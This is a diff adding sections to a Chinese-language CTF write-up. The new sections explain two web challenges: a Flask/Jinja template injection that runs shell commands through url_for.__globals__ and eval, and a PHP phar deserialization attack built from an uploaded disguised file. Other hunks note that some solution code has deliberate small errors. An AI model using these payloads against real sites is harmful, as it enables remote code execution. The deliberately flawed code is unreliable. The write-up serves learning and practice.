@@ -64,6 +64,85 @@ O:4:"Flag":114514:{s:1:"a";s:1:"1";s:4:"%00*%00b";s:1:"2";s:7:"%00Flag%00c";s:1:
 
 传入$interesting变量得到flag。
 
+### 0x05 你要玩蛇吗
+
+看到蛇，猜想和~~Arcaea~~Python有关。点进去用眼睛瞪，发现网页GET了一个name字段并显示在网页上。
+
+使用BurpSuite的Repeater功能看到有一个Server：gunicorn字样，谷歌一下发现确实是一个python的webserver，猜测入手点是python。
+
+众所周知（其实是别人告诉我的），有一个优秀的python web框架叫Flask，默认使用jinja引擎。熟练运用搜索引擎获得一个漏洞示例（下已改为题目格式）
+
+```python
+def cum(name):
+	tp = '{{name}}超喜欢玩蛇哦'
+	return render_template_string(tp, name=name)
+```
+
+其中render_template_string是jinja引擎的模板渲染函数。其中{{name}}表示name变量的值。那么如果我在浏览器地址栏中令/?name={{Fuc1()}}( 其中Fuc1()是一个函数)会发生什么呢？
+
+**函数Fuc1()的返回值将会显示在页面中**
+
+接下来几步涉及Python基础。
+
+1. `__globals__`：每个python函数都含有一个`__globals__`字典，存储“在本函数中可以存储的全局变量”列表。其中一定有一个`__builtins__`变量。
+2. `__builtins__`：我们知道，Python 需要 import 才能引用其他包的函数。但由于一部分函数实在过于常用，所以无需引入也能用。它们就是 `__builtins__` 字典中的函数。
+  比如： `print, open, chr, len, abs, eval`
+3. `eval`：Python的`eval`是把一个字符串当作代码来执行。
+
+也就是我们需要找到一个函数`fun`，调用`fun.__globals__['__builtins__']['eval']()`即可在网站上执行任意代码。
+
+如何找到一个函数呢？搜索得到flask框架中有一个可以直接调用的函数`url_for()`。
+
+那么我们需要执行什么代码呢？有如下语句：
+
+`__import__("os").popen("...").read()`
+
+作用是引入os并调用，返回程序输出。试试直接`cat`一下`flag`？
+
+`/?name={{url_for.__globals__['__builtins__']['eval'](__import__("os").popen("cat flag").read())}}`
+
+发现页面上出现了flag，好神奇哦。
+
+### 0x06 给我康康你的照片
+
+其实我开这题只是想看看有没有别的小可爱传照片，但是其实看不到，恼火。
+
+我实在做不出来，索性使用中国御剑扫描网站目录看到有一个robots.txt文件，点进去发现让我访问s3cr3t.php，立即访问。
+
+其实正确做法是F12看到源码中有一段注释内含“机器人”字样想到访问robots.txt
+
+进行代码审计，发现GET了一个`$interesting`变量，并将其作为文件路径，将文件内容读入到`$file`中。由于`file_get_contents()`的返回值不是空就是字符串，我们无法在返回值上做手脚。考虑搞一个在访问时触发的木马。
+
+考虑构造一个`phar`文件，在读取时利用`phar://`伪协议直接执行其中代码。参照`0x04 最好的语言？`题，我们需要构造一个Flag类型对象并赋值好初始值写入`phar`中，利用`__destruct()`函数输出`flag`。
+
+谷歌一个`phar`文件构造代码，直接进行一个使用：
+
+```php
+<?php
+    class Flag {
+    public $a;
+    protected $b;
+    private $c;
+
+    function __construct() {
+        $this->a = '1';
+        $this->b = '2';
+        $this->c = '3';
+    }
+    }
+    $phar = new Phar("phar.phar");
+    $phar->startBuffering();
+    $phar->setStub("<?php __HALT_COMPILER(); ?>");
+    $o = new Flag();
+    $phar->setMetadata($o);
+    $phar->stopBuffering();
+?>
+```
+
+执行得到phar.phar文件，后缀名改为`png`上传。
+
+访问`/s3cr3t.php?interesting=phar://./upload/.../...png`，发现页面上出现了flag，好神奇哦。
+
 ## Reverse
 
 ### 	0x01 Hello Reverse
@@ -117,6 +196,7 @@ int main() {
         ans += (1 - notp[i]) * i * i;
     printf("%lld\n" ans);
 }
+//这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确
 ```
 
 ### eeeeeezrsa
@@ -188,7 +268,7 @@ p = 12979492918818656033
 
 w = 0
 def MUL(ax, ay, bx, by):
-	return (ax * bx % p + ay * by % p * w % p) % p, (ax * by % p + ay * bx % p) % p
+	return (ax * bx % p + ay * by * w % p) % p, (ax * by % p + ay * bx % p) % p
 
 def power(x, y, b):
 	ax, ay = 1, 0
@@ -203,6 +283,8 @@ while 1 == 1:
 	w = ((a * a % p - n) % p + p) % p
 	if pow(w, (p-1)//2, p) == p-1: break
 print(p - power(a, 1, (p+1)//2))
+
+#这份代码有一些小错误，直接抄写跑不出答案的哦！但是代码逻辑完全正确
 ```
 
 这个数超过了C++能存的范围了（除非写高精），所以被迫写了python。
